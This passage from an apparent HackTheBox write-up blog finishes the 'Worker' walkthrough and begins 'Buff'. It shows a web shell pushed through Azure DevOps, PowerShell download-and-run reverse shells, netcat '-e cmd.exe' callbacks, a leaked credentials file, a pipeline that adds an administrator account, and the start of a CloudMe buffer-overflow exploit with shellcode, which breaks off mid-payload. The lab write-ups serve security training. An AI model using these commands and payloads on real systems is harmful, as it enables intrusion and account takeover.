<p><img class="img-container" src="imgs/image-20210503175452577.png" alt="image-20210503175452577"  />
</p>
<p>I can just drag and drop the web shell, and commit it afterwards.</p>
<p><img class="img-container" src="imgs/image-20210503175506892.png" alt="image-20210503175506892"  />
</p>
<p>From here, I can create a pull request to the master branch to trigger the pipelines or run the Alpha-CI build manually.</p>
<p>If I choose a pull request, it needs to be reviewed first and the reviewer is the user <code>nathen</code> itself, it can decide whether to approve or reject the pull request (well, actually it was me who decide it). It then queue the build.</p>
<p><img class="img-container" src="imgs/image-20210503175518917.png" alt="image-20210503175518917"  />
</p>
<p>The other options is with this queue builds. I can skip the review and run the queue builds for my branch (on the image it is shell branch instead of iamf).</p>
<p><img class="img-container" src="imgs/image-20210503175531792.png" alt="image-20210503175531792"  />
</p>
<p>After the build finished, I can see my web shell is available at <code>alpha.worker.htb/cmdasp.aspx</code>.</p>
<p><img class="img-container" src="imgs/image-20210503175541314.png" alt="image-20210503175541314"  />
</p>
<p>To gain an interactive shell, I&rsquo;ll setup a <code>netcat</code> listener on my Kali, then I&rsquo;ll upload a <a href="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3">PowerShell reverse shell</a> called <code>itsf.ps1</code> and execute it via the web shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">powershell.exe <span style="color:#e6db74">&#34;mkdir c:/temp;invoke-webrequest -uri 10.10.14.19/itsf.ps1 -outfile C:\temp\itsf.ps1;C:\temp\itsf.ps1&#34;</span>
</code></pre></div><p>I have a shell now on my listener.</p>
<p><img class="img-container" src="imgs/image-20210503175604917.png" alt="image-20210503175604917"  />
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-robisl">Shell as robisl</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>Enumerating the user groups and privileges using the <code>whoami /all</code> command reveals that IIS appool has <code>SeImpersonatePrivilege</code> which according to <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">BookHackTrick</a>, it can be abused using RogueWinRM.</p>
<p><img class="img-container" src="imgs/image-20210503175615273.png" alt="image-20210503175615273"  />
</p>
<p>Unfortunately, the WinRM port was already open, I couldn’t exploit it with RogueWinRM. But, I managed to find another way!</p>
<p>Enumerating the Users folder finds two users, <code>robisl</code> and <code>restorer</code> (as the name implies, it restore the box configuration, I&rsquo;ll ignore this).</p>
<p><img class="img-container" src="imgs/image-20210503175630874.png" alt="image-20210503175630874"  />
</p>
<p>By using the <code>net</code> command, it shows that <code>robisl</code> can login remotely.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\Users&gt; net user robisl
User name                    robisl
Full Name                    Robin Islip
Comment                      
User’s comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2020-04-05 21:27:26
Password expires             Never
Password changeable          2020-04-05 21:27:26
Password required            No
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2020-08-18 18:28:36

Logon hours allowed          All

Local Group Memberships      *Production           *Remote 
Global Group memberships     *None                 
The command completed successfully.
</code></pre></div><p>With <code>net</code> command, I also find there is another drive mounted as <code>W:\</code></p>
<pre><code>PS C:\users\&gt;net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
W$           W:\                             Default share
ADMIN$       C:\Windows                      Remote Admin
The command completed successfully.
</code></pre><p>There are 4 folders in the <code>W:\</code> drive, the one that interesting is the svnrepos folder.</p>
<pre><code>PS W:\&gt; dir


    Directory: W:\


Mode                LastWriteTime         Length Name                                                             
----                -------------         ------ ----                                                             
d-----       2020-06-16     18:59                agents                                                          
d-----       2020-03-28     15:57                AzureDevOpsData                                                
d-----       2020-04-03     11:31                sites                                                          
d-----       2020-06-20     16:04                svnrepos
</code></pre><p>I can enumerate all folder and sub folder on the <code>W:\</code> drive recursively using the <code>dir</code> command. Because I&rsquo;m on PowerShell, I have to use <code>cmd /c &lt;command&gt;</code> keyword.</p>
<pre><code>PS W:\&gt; cmd.exe /c &quot;dir /s /b svnrepos&quot;
</code></pre><p>Well PowerShell can do that too, but I prefer <code>cmd</code>.</p>
<pre><code>PS W:\&gt; Get-ChildItem -Path W:\svnrepos -Filter * -Recurse -ErrorAction SilentlyContinue -Force
</code></pre><p>In the output, there is a <code>passwd</code> file that immediately draws my attention</p>
<p><img class="img-container" src="imgs/image-20210504232344047.png" alt="image-20210504232344047"  />
</p>
<p>The <code>passwd</code> file contains a bunch of credentials, and my eyes caught the password for <code>robisl</code>.</p>
<pre><code>PS W:\svnrepos\&gt; gc .\www\conf\passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
</code></pre><h4 id="remote-access---robisl">Remote Access - robisl</h4>
<p>I can login remotely using <code>robisl</code> credentials with <code>evil-winrm</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19»
$ evil-winrm -i 10.10.10.203 -u robisl -p wolves11

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
worker<span style="color:#ae81ff">\r</span>obisl
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>ocuments&gt; cd ../Desktop
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>esktop&gt; dir


    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/29/2020   3:37 PM             <span style="color:#ae81ff">34</span> user.txt
</code></pre></div><h3 id="shell-as-administrator">Shell as administrator</h3>
<h4 id="azure-devops---partsunlimited">Azure DevOps - PartsUnlimited</h4>
<p>After enumerating many things in the remote shell and coming up empty-handed, I returned to Azure DevOps, but this time with a <code>robisl</code> account.</p>
<p><img class="img-container" src="imgs/image-20210503175744995.png" alt="image-20210503175744995"  />
</p>
<p>Long short story, <code>robisl </code> is member of Build Administrator.</p>
<p><img class="img-container" src="imgs/image-20210503175756504.png" alt="image-20210503175756504"  />
</p>
<p>The Build Administrators defined as follows [<a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">source</a>].</p>
<p><img class="img-container" src="imgs/image-20210504010111041.png" alt=""  />
</p>
<h4 id="exploit-azure-pipelines---read-the-root-flag">Exploit Azure Pipelines - Read the Root Flag</h4>
<p>So the plan is, I’ll create an Azure pipelines with malicious deployment script/task to execute OS commands.</p>
<p><img class="img-container" src="imgs/image-20210503175809136.png" alt="image-20210503175809136"  />
</p>
<p>If I lookup into the agent pool in the Project Settings menu, there is an available agent named ‘Setup’. The agent is owned by an Administrator account, and as a Build Administrator member (inherited), user <code>robisl</code> also has access to it.</p>
<p><img class="img-container" src="imgs/image-20210503175820811.png" alt="image-20210503175820811"  />
</p>
<p>So, let’s execute the plan!</p>
<p>First, I’ll create a pipeline (Pipelines -&gt; Builds -&gt;  New Pipeline).</p>
<p><img class="img-container" src="imgs/image-20210503175837201.png" alt="image-20210503175837201"  />
</p>
<p>In the next section, I’ll choose Azure Repos Git.</p>
<p><img class="img-container" src="imgs/image-20210503175848517.png" alt="image-20210503175848517"  />
</p>
<p>On the next one, I’ll select &ldquo;PartsUnlimited&rdquo; as the repository, because that is the repo where <code>robisl</code> is working on.</p>
<p><img class="img-container" src="imgs/image-20210503175906165.png" alt="image-20210503175906165"  />
</p>
<p>In the Configure section, scroll down and select the starter pipeline (I forgot the name, but don&rsquo;t choose the existing one). After that, I’ll modify the pool and the script in the &ldquo;Review&rdquo; section to steal the flag.</p>
<p><img class="img-container" src="imgs/image-20210503175920007.png" alt="image-20210503175920007"  />
</p>
<p>The master branch will be the <code>trigger</code> to run the CI\CD (If I push a changes to the &ldquo;PartsUnlimited&rdquo; repository). Since I have access to the &ldquo;Setup&rdquo; pool, I&rsquo;ll use it as the <code>pool</code>. Lastly, on the <code>steps</code> you can add a task/script you want to run/do. In my case, I want to read the root flag.</p>
<p>I’ll save it and run it on a new branch.</p>
<p><img class="img-container" src="imgs/image-20210503175931307.png" alt="image-20210503175931307"  />
</p>
<p>I’ll just wait for the output log.</p>
<p><img class="img-container" src="imgs/image-20210503175944023.png" alt="image-20210503175944023"  />
</p>
<p>Once it completed, I can see the root flag inside the &ldquo;Steal the flag&rdquo; output</p>
<p><img class="img-container" src="imgs/image-20210503175957351.png" alt="image-20210503175957351"  />
</p>
<h4 id="create-user-with-administrator-privileges">Create User with Administrator Privileges</h4>
<p>I can also create a privileged user using multi-line script.</p>
<pre><code>- script: | 
net user iamf YourComplexPassword /add /domain
net localgroup Administrators iamf /add 
net localgroup &quot;Remote Management Users&quot; iamf /add 
displayName: &quot;Set IamF to Admin&quot;
</code></pre><p>I can push it again and wait for it to complete.</p>
<p><img class="img-container" src="imgs/image-20210503180039057.png" alt="image-20210503180039057"  />
</p>
<p>Now I can login with the newly created user.</p>
<p><img class="img-container" src="imgs/image-20210503180028754.png" alt="image-20210503180028754"  />
</p>
<hr>
<p>References:</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops">https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops</a></li>
<li><a href="https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/">https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/</a></li>
<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers">https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Buff</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-buff/</link>
      <pubDate>Sat, 01 May 2021 16:30:16 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-buff/</guid>
      <description>Buff is a Windows machine with easy difficulty from HackTheBox that features an open source web application called &amp;ldquo;Gym Management System&amp;rdquo;. The application can be exploited using a publicly available exploit. Internal enumeration discovers a program service that is bound to the loopback interface. The program is found to be vulnerable to a buffer overflow attack, and there is also a publicly available exploit to exploit it to gain access as Administrator.</description>
      <content:encoded><![CDATA[<p>Buff is a Windows machine with easy difficulty  from HackTheBox that features an open source web application called &ldquo;Gym Management System&rdquo;. The application can be exploited using a publicly available exploit. Internal enumeration discovers a program service that is bound to the loopback interface. The program is found to be vulnerable to a buffer overflow attack, and there is also a publicly available exploit to exploit it to gain access as Administrator. Because it is bound to the loopback interface, hence a setup for port forwarding is required before sending the exploit.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Gym Management System 1.0 Exploitation</li>
<li>Port Forwarding</li>
<li>CloudMe 1.12 Exploitation</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>searchsploit/Exploit-DB - Preinstalled in Kali Linux</li>
<li>chisel - <a href="https://github.com/jpillora/chisel/releases">https://github.com/jpillora/chisel/releases</a></li>
<li>msfvenom - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial scan with <code>nmap</code> only discovers one port open on 8080 running an Apache web server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «~» «10.10.14.18»
$ mkdir nmap; nmap -sC -sV -oN nmap/initial-buff -v 10.10.10.198

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1g PHP/7.4.6<span style="color:#f92672">)</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n’s Bro Hut
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
<p>Visiting port 8080 displays a website for a Gym, on the title it is called &ldquo;mrb3n&rsquo;s Bro Hut&rdquo;.</p>
<p><img src="imgs/image-20210502140814680.png" alt="image-20210502140814680" style="zoom: 67%;" /></p>
<p>Clicking on the contact page discovers the name of the software behind this web application.</p>
<p><img src="imgs/image-20210502140846741.png" alt="image-20210502140846741" style="zoom:67%;" /></p>
<h4 id="searchsploit">Searchsploit</h4>
<p>I can feed the software name to <code>searchsploit</code>. It shows several exploits, and one that stands out is the remote code execution.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «machines» «10.10.14.18»
$ searchsploit Gym Management System 1.0
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - <span style="color:#e6db74">&#39;id&#39;</span> SQL Injection                                 | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                              | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                        | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution              | php/webapps/48506.py
------------------------------------------------------------------------------- ---------------------------------
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-shaun">Shell as shaun</h3>
<p><code>searchsploit -m</code> allows me to mirror/make a copy of the &ldquo;Gym Management System 1.0 - Unauthenticated Remote Code Execution&rdquo; exploit to the current working directory</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «exploit» «10.10.14.18»
$ searchsploit -m <span style="color:#ae81ff">48506</span>
  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48506
     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/htb/machines/buff/exploit/48506.py


→ root@kali «exploit» «10.10.14.18»
$ ls -l
total <span style="color:#ae81ff">8</span>
-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">5164</span> May  <span style="color:#ae81ff">2</span> 04:29 48506.py
</code></pre></div><p>I’ll rename <code>48506.py</code> to <code>exploit.py</code>, and run it afterwards.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «exploit» «10.10.14.18»
$ python exploit.py http://10.10.10.198:8080/
</code></pre></div><p><img src="imgs/image-20210502153153898.png" alt="image-20210502153153898" style="zoom:67%;" /></p>
<p>With current pseudo shell access, I can&rsquo;t change my directory but I can still grab the user flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\xampp\htdocs\gym\upload&gt; type \users\shaun\desktop\user.txt
</code></pre></div><h4 id="upgrade-to-interactive-shell">Upgrade to Interactive Shell</h4>
<p>To make the shell a bit more comfy, I uploaded a <code>netcat</code> using <code>powershell</code> to Buff, and then I&rsquo;ll create another reverse shell session.</p>
<p>First, I&rsquo;ll host the 64 bit netcat, <code>nc64.exe</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ python -m http.server <span style="color:#ae81ff">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
10.10.10.198 - - <span style="color:#f92672">[</span>14/Aug/2020 10:11:02<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /nc64.exe HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span>
</code></pre></div><p>On Buff, I&rsquo;ll grab the hosted <code>nc64.exe</code> using PowerShell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">C:\xampp\htdocs\gym\upload&gt; powershell.exe <span style="color:#e6db74">&#34;invoke-webrequest -uri http://10.10.14.18/nc64.exe -outfile nc.exe&#34;</span>
</code></pre></div><p>Now I&rsquo;ll setup a listener on my Kali, and send a reverse shell from Buff using the downloaded <code>nc.exe</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\xampp\htdocs\gym\upload&gt;.\nc.exe -e cmd.exe 10.10.14.18 9001
</code></pre></div><p>I have a &ldquo;proper&rdquo; shell now</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ nc -nvlp <span style="color:#ae81ff">9001</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.18<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.198<span style="color:#f92672">]</span> <span style="color:#ae81ff">64518</span>
Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.17134.1550<span style="color:#f92672">]</span>  
<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Microsoft Corporation. All rights reserved.   

C:<span style="color:#ae81ff">\x</span>ampp<span style="color:#ae81ff">\h</span>tdocs<span style="color:#ae81ff">\g</span>ym<span style="color:#ae81ff">\u</span>pload&gt;
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>After enumerating the Users folder, I noticed a slightly different output when typing the <code>dir</code> command in <code>shaun</code> home directory.</p>
<p><img class="img-container" src="imgs/image-20210502155544622.png" alt="image-20210502155544622"  />
</p>
<p>In the Download folder, there is an executable file called <code>CloudMe_1112.exe</code> where 1112 is likely a version number.</p>
<p>Checking on currently running services with <code>netstat</code> discovers.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\xampp\htdocs\gym\upload&gt; netstat -aonp tcp
Active Connections

  Proto  Local Address          Foreign Address        State           PID

...&lt;SNIP&gt;...
  TCP    127.0.0.1:8888            0.0.0.0:0              LISTENING       7352
...&lt;SNIP&gt;...  
</code></pre></div><p>I can search the program name using the <code>tasklist</code> command.</p>
<pre><code>C:\xampp\htdocs\gym\upload&gt; tasklist /FI “PID eq 7352&quot; /v /FO list
</code></pre><p><img src="imgs/image-20210502160832477.png" alt="image-20210502160832477" style="zoom:67%;" /></p>
<p>So PID 7352 on port 8888 is running <code>CloudMe.exe</code>.</p>
<p>Because the user name field is showing as <strong>N/A</strong>, one possible thing is that I don’t have enough privilege to dig for more information about the process because it might be running with a higher privilege (either administrator or a local system).</p>
<h4 id="searchsploit-1">Searchsploit</h4>
<p>A quick search about &ldquo;CloudMe&rdquo; on <code>searchsploit</code> pops several buffer overflow exploits with four of them are exact match.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ searchsploit CloudMe
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow <span style="color:#f92672">(</span>PoC<span style="color:#f92672">)</span>                                         | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow <span style="color:#f92672">(</span>SEH_DEP_ASLR<span style="color:#f92672">)</span>                                | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP <span style="color:#f92672">(</span>DEP_ASLR<span style="color:#f92672">)</span>                                | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow <span style="color:#f92672">(</span>DEP<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                               | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow <span style="color:#f92672">(</span>SEH<span style="color:#f92672">)(</span>DEP Bypass<span style="color:#f92672">)</span>                        | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                 | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                    | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 <span style="color:#f92672">(</span>DEP Bypass<span style="color:#f92672">)</span>                       | windows_x86-64/remote/46250.py
CloudMe Sync &lt; 1.11.0 - Buffer Overflow                                        | windows/remote/44027.py
CloudMe Sync &lt; 1.11.0 - Buffer Overflow <span style="color:#f92672">(</span>SEH<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>DEP Bypass<span style="color:#f92672">)</span>                     | windows_x86-64/remote/44784.py
------------------------------------------------------------------------------- ---------------------------------
</code></pre></div><h4 id="tunneling">Tunneling</h4>
<p>The CloudMe program is currently listening on localhost (bound), so to interact with it, I&rsquo;ll have to setup a tunnel/port forwarding. For this, I&rsquo;ll use <code>chisel</code> (<a href="https://github.com/jpillora/chisel/releases)">https://github.com/jpillora/chisel/releases)</a>.</p>
<blockquote>
<p>Example usage of chisel is explained better in this blog :</p>
<ul>
<li><a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel</a></li>
</ul>
</blockquote>
<p>First, I&rsquo;ll transfer the Windows version of chisel to Buff via PowerShell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">C:\Users\shaun\Download&gt; powershell.exe <span style="color:#e6db74">&#34;invoke-webrequest -uri http://10.10.14.18/chisel.exe -outfile cs.exe&#34;</span>
</code></pre></div><p>Second, I&rsquo;ll setup a chisel server on my Kali.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ chisel server -p <span style="color:#ae81ff">9002</span>
2020/08/14 13:22:18 server: Fingerprint 35:fe:d3:dd:6c:b3:63:35:87:6a:f2:70:52:f1:82:e2
2020/08/14 13:22:18 server: Listening on 0.0.0.0:9002...
</code></pre></div><p>On Buff, I&rsquo;ll connect as client to my chisel server on Kali.</p>
<pre><code>C:\Users\shaun\Download&gt; .\cs.exe client 10.10.14.18:9002 R:8888:127.0.0.1:8888
</code></pre><p><img src="imgs/image-20210502162654346.png" alt="image-20210502162654346" style="zoom:67%;" /></p>
<p>This, will forward the traffics that sent from my Kali Linux on port 8888 to Buff&rsquo;s localhost on port 8888.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Kali localhost:8888 &lt;-&gt; (Kali 10.10.14.18:9002 &lt;-&gt; Buff:10.10.10.198:XXX) &lt;-&gt; Buff localhost:8888
</code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>I&rsquo;ll use this exploit PoC (I&rsquo;ve renamed it to <code>bofexploit.py</code>) but I&rsquo;ll have to modify the payload with my own.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)</span>
<span style="color:#75715e"># Date: 2020-04-27</span>
<span style="color:#75715e"># Exploit Author: Andy Bowden</span>
<span style="color:#75715e"># Vendor Homepage: https://www.cloudme.com/en</span>
<span style="color:#75715e"># Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe</span>
<span style="color:#75715e"># Version: CloudMe 1.11.2</span>
<span style="color:#75715e"># Tested on: Windows 10 x86</span>

<span style="color:#75715e">#Instructions:</span>
<span style="color:#75715e"># Start the CloudMe service and run the script.</span>

<span style="color:#f92672">import</span> socket

target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>

padding1   <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1052</span>
EIP        <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xB5\x42\xA8\x68</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
NOPS       <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>

<span style="color:#75715e">#msfvenom -a x86 -p windows/exec CMD=calc.exe -b &#39;\x00\x0A\x0D&#39; -f python</span>
payload    <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4</span><span style="color:#e6db74">&#34;</span>
